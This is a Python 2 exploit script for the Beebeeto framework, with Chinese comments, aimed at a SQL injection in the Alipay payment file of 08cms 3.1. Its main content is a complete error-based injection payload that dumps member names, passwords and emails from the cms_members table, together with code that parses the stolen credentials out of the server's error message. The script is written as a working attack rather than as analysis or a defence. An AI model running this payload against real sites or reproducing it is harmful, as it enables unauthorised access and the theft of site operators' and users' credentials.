#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0043',           # 由Beebeeto官方编辑
            'name': '08cms 3.1 /include/paygate/alipay/pays.php SQL注入漏洞 EXP',  # 名称
            'author': 'Bug',                   # 作者
            'create_date': '2014-09-30',    # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '08cms',    # 漏洞所涉及的应用名称
            'vul_version': ['3.1'], # 受漏洞影响的应用版本
            'type': 'SQL Injection',# 漏洞类型
            'tag': ['SQL Injection', '08cms漏洞', '信息泄露'],  # 漏洞相关tag
            'desc': '漏洞出现在/include/paygate/alipay/pays.php文件',  # 漏洞描述
            'references': ['http://www.cnseay.com/3333/'],  # 参考链接
        },
    }

    @classmethod
    def verify(cls, args):
        payload = ("/include/paygate/alipay/pays.php?out_trade_no=22'%20AND%20(SELECT%201%20"
                   "FROM(SELECT%20COUNT(*),CONCAT((SELECT%20concat(0x3a,mname,0x3a,password,"
                   "0x3a,email,0x3a)%20from%20cms_members%20limit%200,1),FLOOR(RAND(0)*2))X%20"
                   "FROM%20information_schema.tables%20GROUP%20BY%20X)a)%20AND'")
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(urllib2.Request(verify_url)).read()
        pattern = re.compile(r".*?Duplicate\s*entry\s*[']:(?P<username>[^:]+):(?P<password>[^:]+)", re.I|re.S)#忽略大小写、单行模式
        match = pattern.match(content)
        if match == None:
            args['success'] = False
            return args
        username = match.group("username")
        password = match.group("password")
        args['success'] = True
        args['poc_ret']['vul_url'] = verify_url
        args['poc_ret']['Username'] = username
        args['poc_ret']['Password'] = password
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
